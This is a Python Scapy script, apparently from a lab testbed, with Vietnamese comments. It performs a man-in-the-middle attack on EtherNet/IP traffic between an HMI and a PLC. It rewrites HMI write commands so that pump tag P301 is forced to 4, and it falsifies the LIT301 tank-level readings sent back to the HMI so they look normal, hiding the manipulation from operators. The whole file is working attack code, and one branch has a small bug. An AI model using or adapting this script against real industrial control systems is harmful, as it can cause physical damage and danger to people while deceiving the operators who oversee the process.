#!/usr/bin/python3
from scapy.all import *
import re

HMI_IP = '192.168.1.70'
HMI_MAC = '00:1D:9C:C8:BC:70'
PLC_IP = '192.168.1.30'
PLC_MAC = '00:1D:9C:C8:BD:30'
ATTACKER_IP = '192.168.1.77'
ATTACKER_MAC = 'AA:AA:AA:AA:AA:AA'

ip_mac = {
    '192.168.1.10': '00:1D:9C:C7:B0:10',
    '192.168.1.20': '00:1D:9C:C8:BC:20',
    '192.168.1.30': '00:1D:9C:C8:BD:30',
    '192.168.1.40': '00:1D:9C:C7:FA:40',
    '192.168.1.50': '00:1D:9C:C8:BC:50',
    '192.168.1.60': '00:1D:9C:C7:FA:60',
    '192.168.1.70': '00:1D:9C:C8:BC:70',
    '192.168.1.77': 'AA:AA:AA:AA:AA:AA'
}
INTERFACE = "attacker-eth0"
ATTACKER_MAC = get_if_hwaddr(INTERFACE)
# Bảng MAC học từ traffic
mac_table = {"HMI": HMI_MAC, "PLC": PLC_MAC}

def spoof_pkt(pkt):
    if not (Ether in pkt and IP in pkt and TCP in pkt):
        #sendp(pkt, iface=INTERFACE, verbose=0)
        return

    if pkt[Ether].src == ATTACKER_MAC or pkt[IP].src == ATTACKER_IP:
        return  # tránh lặp chính attacker

    # Học MAC động
    if pkt[IP].src == HMI_IP:
        mac_table["HMI"] = pkt[Ether].src
    elif pkt[IP].src == PLC_IP:
        mac_table["PLC"] = pkt[Ether].src
    #print(mac_table)
    # Tạo gói mới
    newpkt = pkt.copy()
    newpkt[Ether].src = ATTACKER_MAC

    # HMI → PLC
    if pkt[IP].src == HMI_IP and pkt[IP].dst in ip_mac:
        if mac_table["PLC"] is None:
            print("Chưa học MAC của PLC")
            return
        newpkt[Ether].dst = ip_mac[pkt[IP].dst]
        if Raw in newpkt:
           raw = newpkt[Raw].load
           try:
           # 52: request , 4d: service for send function
               if raw[0] == 0x6f and raw[40] == 0x52 and raw[50] == 0x4d:
                  x = raw[51]  # number bytes of tags
                  c3_index = 51 + x*2 +1  # ex: x = 4 (P301) -> index = 60
                  # 0xc3: int , 0xca: float
                  if raw[c3_index] == 0xc3: 
                     print("chinh sua goi tin hmi send -> plc {pkt[IP].dst in ip_mac}")
                     
                     new_raw = bytearray(raw)
                     # P301 = 4 little endian b'\x04\x00' = 4
                     new_raw[c3_index + 4] = 0x04
                     new_raw[c3_index + 5] = 0x00
                     
                     newpkt[Raw].load = bytes(new_raw)
           
           except Exception as e:
                print(f"Error: {e}")
        del newpkt[IP].chksum
        del newpkt[TCP].chksum
        sendp(newpkt, iface=INTERFACE, verbose=0)


    # PLC → HMI
    elif pkt[IP].src in ip_mac and pkt[IP].dst == HMI_IP:
        if mac_table["HMI"] is None:
            print("Chưa học MAC của HMI")
            return
        newpkt[Ether].dst = HMI_MAC
        if Raw in newpkt:
           raw = newpkt[Raw].load
           try:
           # cc: response for 0x4c (service for function receive)
               if raw[0] == 0x6f and raw[40] == 0xcc:
               # ca: float
                  if raw[44] == 0xca: 
                     print("chinh sua goi tin hmi receive <- plc {pkt[IP].src}")
                     
                     new_raw = bytearray(raw)
                     # LIT301 = 0.9 little endian b'\xcd\xcc\x6c\x3f' = 0.92500 (nomal)
                     new_raw[46] = 0xcd
                     new_raw[47] = 0xcc
                     new_raw[48] = 0x6c
                     new_raw[49] = 0x3f
                     newpkt[Raw].load = bytes(new_raw)
                  # c3: int -> 4
                  elif raw[44] == 0xc3:
                     new_raw[46] = 0x04
                     new_raw[47] = 0x00
           except Exception as e:
                print(f"Error: {e}")
        del newpkt[IP].chksum
        del newpkt[TCP].chksum
        sendp(newpkt, iface=INTERFACE, verbose=0)


# Bắt gói
sniff(iface='attacker-eth0', filter='tcp port 44818', prn=spoof_pkt, store=0)